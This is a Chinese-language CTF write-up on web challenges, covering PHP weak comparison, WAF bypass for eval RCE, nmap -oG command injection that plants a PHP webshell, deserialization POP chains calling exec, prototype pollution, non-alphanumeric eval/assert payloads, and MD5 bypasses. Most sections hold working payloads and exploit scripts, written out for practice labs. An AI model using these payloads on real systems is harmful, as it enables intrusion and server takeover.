---
title: web-逻辑漏洞
date: 2026-01-21 19:39:43
tags: [web-逻辑漏洞]
categories:
  - ctf题解
  - web
---



## web-逻辑漏洞

基础脚本：

```
unserialize($_GET['x']);

class A {
    public $cmd;
    function __destruct() {
        system($this->cmd);
    }
}
```



<?php
class A {
    public $cmd = "cat /flag";
}
echo serialize(new A());







## [极客大挑战 2019]BuyFlag

### 1

题目：我一开始是想去把xff改成学校的特定内网ip，发现根本没有用，因为你不知道ip是啥啊

```
Flag

Flag need your 100000000 money
attention

If you want to buy the FLAG:
You must be a student from CUIT!!!
You must be answer the correct password!!!

Only Cuit's students can buy the FLAG

```



由题，没思路，看源码

```
<!--
	~~~post money and password~~~
if (isset($_POST['password'])) {
	$password = $_POST['password'];
	if (is_numeric($password)) {
		echo "password can't be number</br>";
	}elseif ($password == 404) {
		echo "Password Right!</br>";
	}
}
-->
```

1.password弱比较

很矛盾的就是密码是要404，但是又不能是数字

这里就要用到==弱比较，即如果等式两边是字符串和整数，会把字符串转化为数字再进行比较。这就好办了：password=404a不就好了

2.科学计数法

![image-20260101182325159](/images/image-20260101182325159.png)

你发现直接输入数字它显示太长了，用科学计数法就ok

这里还要注意的点，就是你把原本的金额填上去，它会显示你钱不够，那你多填点不就好了

3.改cookie：

构造请求中，cookie的参数是-b

![image-20260101182556727](/images/image-20260101182556727.png)

千辛万苦改完了，但是他说你不是他的学生

![image-20260101182624105](/images/image-20260101182624105.png)

这里抓包后看到了user=0，就说明你不是学生嘛，那把值改成1不就真了

来，改cookie



3.构造请求

```
curl -X POST "http://03a3f5cd-0bd7-4be5-bb55-829058bd107b.node5.buuoj.cn:81/pay.php" -d "password=404a&money=1e9" -b "user=1"
```















## [RoarCTF 2019]Easy Calc

### 1



知识点：

1. WAF (Web Application Firewall)

2. var_dump()：

**var_dump()** 函数用于输出变量的相关信息。

**var_dump()** 函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。

```
<?php
$b = 3.1;
$c = true;
var_dump($b, $c);
?>

输出结果为：

float(3.1)
bool(true)
```

![image-20260101194019184](/images/image-20260101194019184.png)





**进入正题：**



先随便输入，抓包得到 `/calc.php?num=1+1`

再输入一些符号*/'',发现都被waf过滤了，会有提示框跳出来警告



可以看看源代码

```
    $('#calc').submit(function(){
        $.ajax({
            url:"calc.php?num="+encodeURIComponent($("#content").val()), //输入内容会经过编码放到calc.php里去，这不刚好是我们前面得到的东西吗，那就确定在这个页面下注入了
            type:'GET',
            success:function(data){
                $("#result").html(`<div class="alert alert-success">
            <strong>答案:</strong>${data}
            </div>`);
            },
            error:function(){
                alert("这啥?算不来!");
            }
        })
        return false;
    })
```



仔细思考，既然是计算器，一般都会用到eval函数，那我们就输入一些东西让php 远程代码执行（rce)，但是有些符号可能会被我们用到，可以考虑用chr()





所以直接改url就行了，但是如果你直接输入 num=readfile(文件路径),发现被禁止了（就是我前面说的waf），所以我们要绕过waf

![image-20260101193118587](/images/image-20260101193118587.png)



对于waf来说，你输入：? num=.....

他看到的是`空格num`，不是num，他就只认num，所以就放过你了



那么后面正常跟参数就行了





![image-20260101185924710](/images/image-20260101185924710.png)

这里500报错说明你已经进入后端（绕过flag了），只是php解析错误了（你语法不正确嘛）









http://node5.buuoj.cn:27002/calc.php?%20num=var_dump(scandir(chr(46)))

http://node5.buuoj.cn:27002/calc.php?%20num=var_dump(scandir(char(46)))

46是. 

47是/



![image-20260101190705612](/images/image-20260101190705612.png)







![image-20260101190756691](/images/image-20260101190756691.png)



找到了，现在我们要

读取：

file_get_contents()

readfile()

highlight_file()

任选





这里因为没有输入路径，只是输入了文件名，所以错了

![image-20260101191116410](/images/image-20260101191116410.png)



![image-20260101192942012](/images/image-20260101192942012.png)



## 15 第十五章 归真关·竞时净魔

## 

文件上传？其实是竞争漏洞

讨厌这道题目。什么竞争？？条件竞争

1.上传php虽然失败，但我们抓包可以发送出数次

2.同时抓包打开uploads/对应文件名，发送无数次

3.观察响应，成功上传后就ok



##  **竞态条件（Race Condition）**

### 什么是 Race Condition？

> **多个请求“同时”访问同一份资源，
> 程序假设它们是“先后执行”，
> 但现实中它们发生了“时间重叠”，
> 导致逻辑被打乱。**

一句话版：

> **程序没加锁，你来抢时间。**



A：刚把纸放下
B：手刚伸过来想删掉
我：眼睛已经看到了



👉 **“文件存在但还没被删”的极短时间窗口**
 就是漏洞窗口。











## [BUUCTF 2018]Online Tool

### 1



| 字符类型       | 具体字符                                                     | `escapeshellcmd()`的处理方式           |      |
| -------------- | ------------------------------------------------------------ | -------------------------------------- | ---- |
| shell 特殊字符 | `& ;                | $ ( ) ` * ? < >`                       | 加 `\` 转义（比如 `&`→`\&`） |                                        |      |
| 普通字符       | `' " / . 数字 字母`                                          | 不转义；如果前面有`\`，直接删`\`留字符 |      |









```php
<?php
// 第一步：伪造客户端IP（关键铺垫）
if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
// 解释：
// HTTP_X_FORWARDED_FOR是请求头，可伪造（比如用Burp/PostMan改）；
// 这行代码的意思是：如果有这个请求头，就把客户端真实IP替换成这个头的值；
// 目的：后面生成沙箱目录依赖REMOTE_ADDR，我们可以通过改这个请求头控制沙箱名称。

// 第二步：判断是否传了host参数
if(!isset($_GET['host'])) {
    highlight_file(__FILE__); // 没传host的话，显示当前代码源码
} else {
    // 第三步：处理host参数（看似过滤，实则有坑）
    $host = $_GET['host'];          // 获取URL里的?host=xxx参数
    $host = escapeshellarg($host);  // 把参数用单引号包裹+转义单引号（比如把'变成\'）   注意顺序！！！1
    $host = escapeshellcmd($host);  // 转义命令行特殊字符（比如&;|`$()等）
    //总之，arg+cmd，先转义'，又拆掉转义，做了跟没做一样，不用管他
    
    举例：
        传入  172.17.0.2' -v -d a=1
        经过escapeshellarg， 变成 '172.17.0.2\' -v -d a=1'
        经过escapeshellacmd， 变成 '172.17.0.2' -v -d a=1'
    
    

    // 第四步：生成并进入沙箱目录
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']); // 用固定字符串+IP做MD5，生成唯一目录名
    echo 'you are in sandbox '.$sandbox; // 输出沙箱名称
    @mkdir($sandbox); // 创建沙箱目录（@屏蔽报错，比如目录已存在）
    chdir($sandbox);  // 进入这个沙箱目录（后续命令都在这个目录执行）
    
    
    //chdir($sandbox)的本质就是 “进入这个沙箱目录”，而 “进入” 的底层实现，就是操作系统把当前进程的「默认工作目录」改成这个目录
    

    // 第五步：执行nmap命令并输出结果
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
    
    //通过 PHP 的字符串拼接符 . ，直接贴到-F后面
    
    
    //输入：
    //127.0.0.1' <?php echo `cat /flag`;?> -oG test.php '
    //arg:
    //'127.0.0.1/' <?php echo `cat /flag`;?> -oG test.php /''
    //cmd:
    //'127.0.0.1' <?php echo `cat /flag`;?> -oG test.php ''
 
    
    //拼接：
    //nmap -T5 -sT -Pn --host-timeout 2 -F '127.0.0.1' <?php echo `cat /flag`;?> -oG test.php ''
    
    //nmap 命令实际执行逻辑：
    //1.nmap 会把''当成空参数，忽略；
    //2.-oG是 nmap 的合法参数，作用是 “把扫描结果输出到 test.php 文件”；
    //3. <?php echo cat /flag;?> 会被 nmap 当成 “扫描目标”，最终和 nmap 的扫描日志一起写入 test.php 文件；

    
    
    // 解释：
    // system()会执行拼接后的命令，并把结果输出到页面；
    
}
?>
```





1.输入

payload1

```
?host=127.0.0.1' <?php echo `cat /flag`;?> -oG test.php '
```

payload2

```
?host=127.0.0.1' <?php echo `cat /flag`;?> -oG test.php #
```



2.得到沙箱

![image-20251220205145783](/images/image-20251220205145783.png)





3.访问沙箱下面的test.php



![image-20251220205251772](/images/image-20251220205251772.png)





知识点总结：

1.关于前后单引号

127.0.0.1' <?php echo `cat /flag`;?> -oG test.php '

因为经过arg，整个host会被包裹上单引号，所以为了避免语法错误，我们需要前面少一个单引号，后面多一个单引号给他闭合掉



2.关于127.0.0.1

nmap必须要有一个扫描的目标，所以必须填写





3.**nmap参数`-oG`:将命令和结果写到文件**

直接写入命令 cat /flag

/：根目录下

``:php语法中，反引号把字符串变成可执行系统命令；    没有它，你的代码只是打印文字，不是执行读文件的命令。

```
?host=' <?php echo `cat /flag`;?> -oG test.php '
```







4.**R**emote **C**ode **E**xecution

**远程代码执行（Remote Code Execution，RCE）** 是一种严重的安全漏洞，允许攻击者在目标系统上执行任意代码或命令。



RCE漏洞的原理

RCE漏洞的产生通常是因为应用程序提供了执行系统命令或代码的接口，而这些接口没有对用户输入进行严格的过滤。例如，某些网络设备（如路由器、防火墙、入侵检测系统）的Web管理界面允许用户输入IP地址进行ping操作。如果没有对输入进行严格的验证，攻击者可以通过该接口注入恶意命令，从而控制后台服务器。



RCE漏洞的危害

1. **执行系统命令**：攻击者可以执行任意系统命令，获取系统信息或执行恶意操作。
2. **读取和写入文件**：攻击者可以读取或修改服务器上的文件，获取敏感信息或篡改数据。
3. **反弹Shell**：攻击者可以通过反弹Shell获取服务器的控制权，进一步进行渗透攻击。
4. **控制整个服务器**：攻击者可以完全控制服务器，执行任意操作。













## 19 第十九章_revenge



```
 <?php
highlight_file(__FILE__);

class Person
{
    public $name;
    public $id;
    public $age;
}

class PersonA extends Person
{
    public function __destruct()
    {
        $name = $this->name;
        $id = $this->id;
        $name->$id($this->age);
    }
}

class PersonB extends Person
{
    public function __set($key, $value)
    {
        $this->name = $value;
    }

    public function __invoke($id)
    {
        $name = $this->id;
        $name->name = $id;
        $name->age = $this->name;
    }
}

class PersonC extends Person
{
    public function check($age)
    {
        $name=$this->name;
        if($age == null)
        {
            die("Age can't be empty.");
        }
        else if($name === "system")
        {
            die("Hacker!");
        }
        else
        {
            var_dump($name($age));
        }
    }

    public function __wakeup()
    {
        $name = $this->id;
        $name->age = $this->age;
        $name($this);
    }
}

if(isset($_GET['person']))
{
    $person = unserialize($_GET['person']);
} 
```

禁用system，换exec

1.`exec`是 PHP 里用来**执行系统命令**的函数，和你之前想用到的`system`功能几乎一样

2.





### 核心思路

代码有自动执行链，避开禁用的 system 改用 exec，不用读文件而是查环境变量，让 A/B/C 互相指向触发执行，就能拿到 flag。

1. **找链条**：代码里 C→B→A→C 会自动跑一遍，最后到 C 执行命令；
2. **绕限制**：system 不能用就用 exec，flag 不在文件里就用 env 查环境变量；
3. **拼 Payload**：让 A/B/C 互相指向，传 exec 和 env，跑通链条就拿到 flag。

### 









哎，抄答案吧，代审太难了，根本不理解



```php
<?php
// 1. 仅保留必要类定义（去掉冗余空行/注释，保留核心方法）
class Person { public $name; public $id; public $age; }
class PersonA extends Person {
    public function __destruct() {
        $name = $this->name;
        $id = $this->id;
        $name->$id($this->age); // 核心：调用C的check方法
    }
}
class PersonB extends Person {
    public function __set($key, $value) { $this->name = $value; } // 保留__set（虽未用到，但不删）
    public function __invoke($id) {
        $name = $this->id;
        $name->name = $id;     // 给C的name赋值
        $name->age = $this->name;
    }
}
class PersonC extends Person {
    public function check($age) {
        $name = $this->name;
        if ($age == null) die("Age can't be empty.");
        elseif ($name === "system") die("Hacker!");
        else var_dump($name($age)); // 执行命令
    }
    public function __wakeup() {
        $name = $this->id;
        $name->age = $this->age;
        $name($this); // 触发B的__invoke
    }
}

// 2. 精简Payload构造逻辑（修复$d未定义错误，保留核心赋值）
$personB_object = new PersonB();
$personC_object = new PersonC();
$personA_object = new PersonA();

// 核心赋值（触发链：C->B->A->C）
$personB_object->id = $personC_object; // B的id指向C
$personC_object->name = "exec";        // 用exec替代system，绕开拦截
$personC_object->id = $personB_object; // C的id指向B
$personC_object->age = "env";          // 执行env命令（可替换为cat /flag）
$personA_object->name = $personC_object; // A的name指向C
$personA_object->id = "check";         // 调用C的check方法
$personA_object->age = "env";          // 命令参数

// 3. 输出URL编码后的序列化字符串（直接用）
echo urlencode(serialize($personA_object));
?>

```











## mini-l ctf web Clickclick



抓包详细：

```
POST /update-amount HTTP/1.1
Host: 127.0.0.1:35023
略

{"type":"set","point":{"amount":null}}
```







不就是点击一百次吗？

来个脚本：

```javascript
let button = document.querySelector('button')
for (let i = 0; i < 10000; i++) { button.click(); }
```

回应：

Click 10000 times, and something appear.

什么叫“前后端分离”啊？（战术后仰）

```
if ( req.body.point.amount == 0 || req.body.point.amount == null) { delete req.body.point.amount }
    
```





所以我们可以利用这个漏洞：把amount的值改成0，这样它就会被删除，然后我们再向他祖宗point悄悄塞进去一万



1. `__proto__` **指向这个对象的 “原型（祖宗）”**。比如你创建一个空对象 `const point = {}`，`point.__proto__` 就指向所有对象的 “公共祖宗”（Object.prototype）。







```javascript
// 1. 发送请求到指定接口（这道题是 /update-amount ）
fetch('/update-amount', {  //就是这里需要改成按钮相关信息网页
  // 2. 请求方式（固定POST，不用改）
  method: 'POST',
  // 3. 告诉后端传的是JSON格式（固定，不用改）
  headers: { 'Content-Type': 'application/json' },
  // 4. 核心污染数据（固定，不用改）
  body: JSON.stringify({
    "type": "set",
    "point": {
      "amount": null,
      "__proto__": {
        "amount": 10000
      }
    }
  })
})
// 5. 请求成功后，弹窗显示结果（固定，不用改）
.then(r => r.text())
.then(res => alert("返回结果：" + res))
// 6. 请求失败后，弹窗显示错误（固定，不用改）
.catch(err => alert("出错了：" + err));


```







## GuessOneGuess



```
module.exports = function(io) {
    io.on('connection', (socket) => {
        let targetNumber = Math.floor(Math.random() * 100) + 1;
        let guessCount = 0;
        let totalScore = 0;
        const FLAG = process.env.FLAG || "miniL{THIS_IS_THE_FLAG}";
        console.log(`新连接 - 目标数字: ${targetNumber}`);

    
        socket.emit('game-message', {
            type: 'welcome',
            message: '猜一个1-100之间的数字！',
            score: totalScore
        });

        
        socket.on('guess', (data) => {
            try {
              console.log(totalScore);
                const guess = parseInt(data.value);

                if (isNaN(guess)) {
                    throw new Error('请输入有效数字');
                }

                if (guess < 1 || guess > 100) {
                    throw new Error('请输入1-100之间的数字');
                }

                guessCount++;

                if (guess === targetNumber) {
                   
                    const currentScore = Math.floor(100 / Math.pow(2, guessCount - 1));
                    totalScore += currentScore;

                    let message = `🎉 猜对了！得分 +${currentScore} (总分数: ${totalScore})`;
                    let showFlag = false;

                    if (totalScore > 1.7976931348623157e308) {
                        message += `\n🏴 ${FLAG}`;
                        showFlag = true;
                    }

                    socket.emit('game-message', {
                        type: 'result',
                        win: true,
                        message: message,
                        score: totalScore,
                        showFlag: showFlag,
                        currentScore: currentScore
                    });

                    
                    targetNumber = Math.floor(Math.random() * 100) + 1;
                    console.log(`新目标数字: ${targetNumber}`);
                    guessCount = 0;
                } else {
                    if (guessCount >= 100) {
                      console.log("100次未猜中！将扣除当前分数并重置");
                        socket.emit('punishment', {
                            message: "100次未猜中！将扣除当前分数并重置",
                        });
                        return;
                    }
                    socket.emit('game-message', {
                        type: 'result',
                        win: false,
                        message: guess < targetNumber ? '太小了！' : '太大了！',
                        score: totalScore
                    });
                }
            } catch (err) {
                socket.emit('game-message', {
                    type: 'error',
                    message: err.message,
                    score: totalScore
                });
            }
        });
        socket.on('punishment-response', (data) => {
          totalScore -= data.score;
          guessCount = 0;
          targetNumber = Math.floor(Math.random() * 100) + 1;
          console.log(`新目标数字: ${targetNumber}`);
          socket.emit('game-message', {
            type: 'result',
            win: true,
            message: "扣除分数并重置",
            score: totalScore,
            showFlag: false,
          });

        });
    });
};
```





看关键，showflag一直是false，只有：

```
if (totalScore > 1.7976931348623157e308) {
                        message += `\n🏴 ${FLAG}`;
                        showFlag = true;
```

得分大于这个恶心的数字时才为true



JS 最大正常数：`1.7976931348623157e308`（记为「最大值」）；





但是规则有点不一样：



1. 加分规则：猜中才加分，但单次得分少，靠正常猜永远到不了目标分数；

```javascript
const currentScore = Math.floor(100 / Math.pow(2, guessCount - 1));
```

- 人话翻译：
  - `guessCount` = 你猜中数字前的「总猜测次数」（比如 1 次猜中，次数就是 1；5 次猜中，次数就是 5）；
  - `Math.pow(2, n)` = 2 的 n 次方（比如 2¹=2，2³=8）；
  - `Math.floor()` = 向下取整（只保留整数，比如 31.2→31）；
  - 最终得分 = 100 ÷ (2 的「猜中次数 - 1」次方)，再取整。

| 猜中次数  | 计算过程               | 本次得分 | 总分（假设初始 0）       |
| --------- | ---------------------- | -------- | ------------------------ |
| 1 次猜中  | 100 ÷ (2⁰) = 100 ÷ 1   | 100      | 100                      |
| 2 次猜中  | 100 ÷ (2¹) = 100 ÷ 2   | 50       | 50                       |
| 3 次猜中  | 100 ÷ (2²) = 100 ÷ 4   | 25       | 25                       |
| 4 次猜中  | 100 ÷ (2³) = 100 ÷ 8   | 12       | 12（100/8=12.5→取整 12） |
| 5 次猜中  | 100 ÷ (2⁴) = 100 ÷ 16  | 6        | 6（100/16=6.25→取整 6）  |
| 10 次猜中 | 100 ÷ (2⁹) = 100 ÷ 512 | 0        | 0（100/512≈0.19→取整 0） |



1. 扣分漏洞：传负数让 “扣分” 变 “加分”，多次传就能让总分变成无穷大；



```
socket.on('punishment-response', (data) => {
          totalScore -= data.score;
```



那就穿个负数进去，多穿几个不久很大了吗







```javascript
// 极简版 - 分行格式（核心逻辑不变）
const s = io();

// 1. 刷无穷大总分（10次足够）
for(let i=0; i<10; i++) {
  s.emit('punishment-response', { score: -1.5e308 });
}

// 2. 自动猜1-100所有数字
for(let n=1; n<=100; n++) {
  s.emit('guess', { value: n });
}

// 3. 抓到flag就弹窗
s.on('game-message', d => {
  if(d.message?.includes('miniL')) alert(d.message);
});
```







```javascript
module.exports = function(io) { // io 是 Socket.IO 的核心对象
    io.on('connection', (socket) => { // 监听客户端连接（Socket.IO 固定写法）
        socket.emit('game-message', { ... }); // 给客户端发消息（emit = 发送）
        socket.on('guess', (data) => { ... }); // 监听客户端的'guess'事件（on = 接收）
        socket.on('punishment-response', (data) => { ... });
    });
};
```

1.发现 `io`、`socket.emit`、`socket.on` → 确定是 Socket.IO；



2.`socket.emit()`/`socket.on()`，就知道要按 Socket.IO 的方式（`io()` 建连接、`emit()` 发请求）解题

```javascript
// 1. 建立连接（必写）
const socket = io();

// 2. 给后端发消息（按需写）
socket.emit('事件名', { key: 值 });

// 3. 监听后端消息（按需写）
socket.on('事件名', (接收的参数) => {
  // 处理收到的消息（比如拿flag）
});
```











## [极客大挑战 2019]RCE ME

### 1

```
<?php
error_reporting(0);
if(isset($_GET['code'])){
            $code=$_GET['code'];
                    if(strlen($code)>40){              //字数限制
                                        die("This is too Long.");
                                                }
                    if(preg_match("/[A-Za-z0-9]+/",$code)){
                                        die("NO.");
                                                }
                    @eval($code);
}
else{
            highlight_file(__FILE__);
}

// ?>
```



不允许输入数字和字母。

那怎么让eval执行呢？

可以用一种方式，或许它确实不是由字母和数字组成（maybe一些符号标点？），但是他表达出来的意思确实是我们想要的命令：

三种方法：

取反

异或

自增





1.或许你可以先看看phpinfo有哪些函数被禁用了（具体构造看知识点3）

```
?code=$_=~%8f%97%8f%96%91%99%90;$_();
```

system被禁用了





![image-20251227163010489](/images/image-20251227163010489.png)





2.构造payload

eval作为一个语言构造器，并不能被当作函数调用，

比如 `eval()`、`echo()`、`isset()`、`include()`。 这些不是函数，而是 **PHP 指令的一部分**。它们在代码编译阶段就已经被固定死了。它们没有入口地址，所以你不能用 `$a = "eval"; $a();` 去找它。



所以我们assert（想了解这个函数去看知识点4）

构造出类似这样的payload：

```
?code=(assert)(eval($_POST["cmd"]))；
```

```
?code=(~%22%9e%8c%8c%9a%8d%8b%22)(~%22%9a%89%9e%93%d7%db%a0%af%b0%ac%ab%a4%dd%9c%92%9b%dd%a2%d6%22)；
```



异或太长了：

```
?code=(%22%21%28%28%25%29%29%22^%22%40%5b%5b%40%5b%5d%22)(%22%25%28%21%2c%21%21%21%2b%40%28%28%24%21%23%2d%24%21%21%21%22^%22%40%5e%40%40%09%05%7e%7b%0f%7b%7c%7f%03%40%40%40%03%7c%08%22)
```





3.连接蚁剑，

发现flag啥都没有，是因为



### 1. 权限限制 (Permission Denied) —— **最可能的原因**

这是 CTF 中最常见的套路。`/flag` 文件确实存在，但它的权限被设置成了只有 `root` 用户才能读取。

- **如何确认**：在蚁剑终端输入 `ls -l /flag`。
- **看结果**：
  - 如果显示 `-r-------- 1 root root`：说明只有 root 能读，你（www-data）没权限。这时候你需要寻找**提权**路径（比如寻找刚才提到的 `/readflag` 程序）。
  - 如果显示 `-rwxr-xr-x`：说明你可以读，但文件依然为空，那可能是文件本身就被清空了，或者 Flag 在别处。

------

### 2. 函数被禁用 (Disable Functions) —— **绕过限制**

如果你能看到文件，权限也对，但是 `cat` 命令或者蚁剑的文件管理器点开是空的，可能是 PHP 的配置文件 `php.ini` 禁用了读取文件的函数。

- **如何确认**：查看 `phpinfo()`，搜索 `disable_functions` 这一项。
- **常见的“阉割”列表**：如果里面出现了 `system`, `exec`, `passthru`, `shell_exec`, `file_get_contents` 等，说明你无法直接调用系统命令读文件。
- **表现**：你执行命令时，返回结果为空，或者提示 `function is disabled`。





![image-20251227201231091](/images/image-20251227201231091.png)



所以为了解决问题，我们安装了插件（绕过函数限制），也就解决了第二个可能问题

ls -/  ok

cat /flag   哟不行了，因为有权限啊，第一个可能问题还没解决。

这个看一眼别人，和看一眼别人的隐私区别还是很大的，所以权限级别不一样嘛。



看一下根目录，寻找readflag或者类型的运行文件





4.运行有suid权限的文件



运行 `readflag` 这种文件，并不是让你“获得临时 root 权限”（也就是你的身份还是 `www-data`），而是**这个程序本身在运行那一刻拥有 root 权限**，它替你去读文件，然后把结果告诉你。

------

### 1. 它的原理是什么？（SUID 权限）

在 Linux 中，这叫 **SUID (Set User ID)**。

- **普通程序**：你运行 `cat`，`cat` 的权限就是你的权限（保洁员）。
- **SUID 程序**：你运行 `readflag`，虽然你是保洁员，但 `readflag` 这个程序被贴上了“总裁特权”的标签。在它运行的几秒钟里，它能打开保洁员打不开的保险柜，把里面的东西读出来给你看。

------

### 2. 如何在根目录下精准找到它？

你不能只靠眼睛看，因为有时候它不叫 `readflag`，可能叫 `get_flag` 或者一串乱码。你要找的是**“权限里带 s 的绿色文件”**。

在终端输入这个命令（这是所有 CTF 选手的肌肉记忆）：

Bash

```
ls -al /
```

**看结果里的这一段：**

- 如果权限是 `-rwxr-xr-x`：这只是个普通文件，没用。
- 如果权限是 `-rw**s**r-xr-x`：看到那个 **`s`** 了吗？这就是“特权”的标志！

------

### 4. 运行它后会发生什么？

你运行 `/readflag`，通常会出现以下几种回显：

1. **直接给 Flag**：最爽的情况，直接 `flag{...}`。
2. **验证码/交互**：它会说 `Please solve this: 10 + 20 = ?`。
   - **坑点**：蚁剑的终端有时不支持这种交互。
   - **解决**：用 `echo "30" | /readflag`（利用管道把答案喂给它）。
3. **参数读取**：它可能需要你指定文件。
   - **操作**：`/readflag /flag`。







```
(*) 基础信息
当前路径: /var/www/html
磁盘列表: /
系统信息: Linux out 5.15.0-161-generic #171-Ubuntu SMP Sat Oct 11 08:17:01 UTC 2025 x86_64
当前用户: www-data
(*) 输入 ashelp 查看本地命令
(www-data:/var/www/html) $ cat /flag              //查都没有
(www-data:/var/www/html) $ ls /
bin
boot
dev
etc
flag
home
lib
lib64
media
mnt
opt
proc
readflag
root
run
sbin
srv
sys
tmp
usr
var
(www-data:/var/www/html) $ /readflag       //运行一下它
flag{32337c9d-8e6d-42de-b5d6-791fcd592089}
```













知识点：



**1.动态函数调用**

这涉及 PHP 7 的一个核心特性：**动态函数调用**。

- **传统写法**：`assert(...);`
- **PHP 7 写法**：`("assert")(...);`

在 PHP 7 中，如果你在括号里放一个字符串，后面紧跟着另一个括号，PHP 会把第一个括号里的字符串当成**函数名**去执行。









**2.知识点二（数字字母绕过）**

目标：**绕过 `preg_match("/[A-Za-z0-9]+/", $code)` **

------

### 1. 取反绕过 (Bitwise NOT `~`)

- **原理：** 在 PHP 中，`~` 是按位取反运算符。它会将 8 位二进制数的 `0` 变为 `1`，`1` 变为 `0`。
- **计算过程：**
  1. 字母 `a` 的 ASCII 码是 `97`，二进制是 `01100001`。
  2. 对 `01100001` 取反，得到 `10011110`。
  3. `10011110` 转换成十六进制是 `0x9E`。
  4. `0x9E` 是一个不可见字符（非字母非数字）。
- **代码实现：** `(~%9E)` 在 PHP 执行时，会先把 `%9E` 这个不可见字符取反，结果回到了二进制 `01100001`，即字符 `a`。
- **Payload 构造：** 你想构造 `phpinfo`，就先对 `p, h, p, i, n, f, o` 每个字母取反，得到一串 `%xx` 的编码，最后组合成 `(~%8F%8E%8F%8D%8C%9A%8B)();`。

------

### 2. 异或绕过 (XOR `^`)

- **原理：** 异或运算的规则是“相同为 0，不同为 1”。
- **计算过程：**
  1. 字符 `?` 的 ASCII 是 `63` (`00111111`)。
  2. 字符 `~` 的 ASCII 是 `126` (`01111110`)。
  3. 执行 `00111111 ^ 01111110`，结果是 `01000001`。
  4. `01000001` 对应的 ASCII 字符是 `p`。
- **绕过逻辑：** 虽然 `p` 是字母，会被正则拦截，但 `?` 和 `~` 都是符号，正则允许通过。
- **代码实现：** `$a = ("?" ^ "~");` 这行代码里没有任何字母数字，但变量 `$a` 的值变成了 `"p"`。通过多次异或拼接，可以拼出 `system` 等函数名。

------

### 3. 自增绕过 (Increment `++`)

- **原理：** PHP 继承了 Perl 的特性，支持对字符串进行自增操作。如果你对字符 `'a'` 执行 `++`，它会变成 `'b'`。
- **关键知识：**
  1. **如何获得第一个字符？** PHP 中，如果定义一个变量 `$a = [];`（空数组），当你把它当字符串用时（例如 `"$a"`），PHP 会强制转换它为字符串 `"Array"`。
  2. **提取首字母：** `$_ = [].'';` 此时 `$_` 的值是 `"Array"`。
  3. **获取 'A'：** `$_ = $_[0];`（取字符串第一个字符，即 `A`）。
  4. **递增：** `$__ = $_; $__++;`（此时 `$__` 变成了 `B`）。
- **绕过逻辑：** 利用符号（如 `[]`, `.`, `_`）得到一个初始字母，再通过反复自增，凑齐你需要的 `s, y, s, t, e, m` 等字母。整个过程不涉及任何硬编码的字母。



```
$_ = [];          // 定义数组
$_ = $_ . "";     // 强制转字符串，此时 $_ 是 "Array"
$_ = $_[0];       // 取第一个字符，此时 $_ 是 "A"

// 如果想要 'S' (system 的开头)
$s = $_; 
for($i=0; $i<18; $i++){ $s++; } // A 自增 18 次变成 S
echo $s; // 输出 S
```

```
?code=$_=[];$_=$_."";$_=$_[0];$__=$_;$__++;$__++;$__++;......(以此类推)
```



3. **php可变函数**

**“可变函数”**： 如果一个变量后面跟着括号，如 `$a()`，PHP 会寻找名字叫做“变量 `$a` 的值”的函数并执行。

- **步骤 A：** 使用取反/异或/自增构造出字符串 `"system"`，存入变量 `$_`。
- **步骤 B：** 使用取反/异或/自增构造出字符串 `"ls /"`，存入变量 `$__`。
- **步骤 C：** 执行 `$_($__)`。这在底层等同于调用 `system("ls /")`。



易错点：

正确语法

```
$_ = "phpinfo"; 
$_();
```

举例：

```
?code=(~%8f%97%8f%96%91%99%90)()  //code="phpinfo"()，明显是个字符串，而字符串后面跟括号语法错误，必须是变量

?code=$_=~%8f%97%8f%96%91%99%90;$_();  //没有关系，即使code里面得到的只是字符串，无法中eval执行，但是phpinfo本身就是个函数，他可以自己执行
```

其实这里产生了一个问题，为什么异或操作后面加上()就可以被当作函数执行呢？

那是因为异或的写法 `("a"^"b")()` 触发了 PHP 7 的一个“骚操作”补丁，而取反 `(~a)()` 因为符号优先级问题，经常触发不了这个补丁，导致报错。



4.`assert()`：狡猾的“纠错哨兵”

`assert` 原本是用来做代码调试的（判断某个条件是否成立），但在 PHP 5 和早期 PHP 7 中，它有一个非常危险的特性。

- **它的功能**：如果传给它的参数是**字符串**，它会把这个字符串当作 PHP 代码执行。



**(**assert)(eval($_POST["test"]))





5./readflag

`/readflag` 是一个**编译好的可执行程序**（就像 Windows 里的 `.exe` 文件）。当你输入 `/readflag` 并回车时，计算机会执行这个程序内部写死的逻辑：

1. **程序启动**：它会立刻向 Linux 系统申请“临时 root 权限”。
2. **寻找文件**：它在代码里已经写好了：“去打开 `/flag` 这个文件”。
3. **读取内容**：它把文件里的字符串（即真正的 Flag）读取到内存中。
4. **打印输出**：它执行类似 `printf` 或 `echo` 的指令，把内容吐在你的屏幕上。

**所以，你运行 `/readflag` 就等同于执行了一套组合拳：**

> 申请权限 -> 找到 flag 文件 -> 读取内容 -> 打印出来。













## [BJDCTF2020]Easy MD5

### 1







题目：

1.抓包看到有hint: select * from 'admin' where password=md5($pass,true)

md5($pass,true)：

true和false

给个经典的绕过：ffifdyop,这个MD5加密后会返回’or’6XXXXXXXXX(这里的XXXXX是一些乱码和不可见字符，是true造成的，false就不是乱码了)

这里的SQL语句会变成

```
select * from `admin` where password=''or'6XXXXXXXXX'  
```

2.绕过后来到了这里：**GET** /levels91.php **HTTP/1.1**

看到：

```
<!--
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
-->
```

发现是md5弱比较绕过，可用科学计数法或者数组



3.最后来到这里

```
 <?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
    echo $flag;
} 
```

`!==`严格要求：值不同，类型不同

md5的`===`严格要求：md5编码后的值和类型完全相同

看起来很矛盾，但是可以用 数组或者强碰撞 来解决



payload:

```
param1[]=1&param1[]=2
```









知识点：

### 1.md5弱比较绕过

有一些字符串的MD5值为0e开头，

- QNKCDZO
- 240610708
- s878926199a
- s155964671a
- s214587387a

还有MD5和双MD5以后的值都是0e开头的

- CbDLytmyGm2xQyaLNhWn
- 770hQgrBOjrcqftrlaZk
- 7r4lGXCH2Ksu2JNT3BYM



### 2.弱比较绕过

#### 1.字符串与数字比较

